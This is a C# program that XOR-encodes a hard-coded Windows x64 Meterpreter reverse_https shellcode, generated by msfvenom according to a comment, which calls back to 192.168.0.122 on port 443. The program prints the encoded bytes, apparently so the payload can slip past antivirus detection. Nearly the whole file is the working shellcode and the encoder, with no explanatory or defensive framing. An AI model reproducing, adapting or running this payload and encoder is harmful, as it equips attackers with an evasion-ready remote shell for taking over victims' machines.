using System;

namespace XORPayloadEncoder
{
    internal class Program
    {
        public static void XorByInputKeyEnc(byte[] shellcode, int shellcodeSize, byte[] key, int keySize)
        {
            for (int i = 0, j = 0; i < shellcodeSize; i++, j++)
            {
                if (j >= keySize)
                {
                    j = 0;
                }
                shellcode[i] ^= key[j];
                Console.Write("0x{0:X2},", shellcode[i]);
            }
        }

        static void Main(string[] args)
        {
            byte[] key = new byte[16] { 0xFC, 0xDF, 0x3F, 0xAC, 0xDB, 0x12, 0x01, 0xFD, 0xDF, 0xB2, 0x2A, 0x9C, 0x7D, 0x21, 0x11, 0xCC };

            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.122 LPORT=443 -f csharp EXITFUNC=thread
            byte[] shellcode = new byte[627] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
                0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
                0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,
                0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
                0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
                0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,
                0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
                0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x44,0x8b,0x40,0x20,0x8b,0x48,0x18,0x50,0x49,0x01,0xd0,
                0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,
                0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,0xac,0x41,
                0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
                0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
                0x41,0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x48,0x01,0xd0,0x5e,
                0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
                0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
                0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,
                0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,
                0x49,0xc7,0xc2,0x4c,0x77,0x26,0x07,0xff,0xd5,0x53,0x53,0x48,
                0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,
                0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
                0xe8,0x0e,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,
                0x2e,0x30,0x2e,0x31,0x32,0x32,0x00,0x5a,0x48,0x89,0xc1,0x49,
                0xc7,0xc0,0xbb,0x01,0x00,0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,
                0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,0x00,0x00,
                0xff,0xd5,0xe8,0x49,0x00,0x00,0x00,0x2f,0x6e,0x77,0x43,0x4f,
                0x38,0x35,0x6f,0x68,0x55,0x49,0x67,0x36,0x51,0x44,0x74,0x43,
                0x58,0x4b,0x51,0x76,0x39,0x41,0x6d,0x66,0x38,0x59,0x4f,0x77,
                0x57,0x56,0x31,0x75,0x59,0x48,0x51,0x61,0x41,0x67,0x67,0x32,
                0x59,0x5a,0x2d,0x33,0x32,0x5f,0x6d,0x66,0x51,0x54,0x66,0x50,
                0x65,0x65,0x37,0x33,0x38,0x45,0x77,0x48,0x75,0x48,0x53,0x5a,
                0x64,0x36,0x58,0x73,0x64,0x42,0x6e,0x00,0x48,0x89,0xc1,0x53,
                0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,
                0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,
                0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,
                0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,
                0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,
                0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,
                0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,
                0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,
                0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,
                0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,
                0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,
                0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,
                0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,
                0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,
                0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,
                0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,
                0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,
                0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0xbb,
                0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5};


            XorByInputKeyEnc(shellcode, shellcode.Length, key, key.Length);
            Console.WriteLine("[*] The size of array is: " + shellcode.Length);
            Console.ReadLine();
        }
    }
}
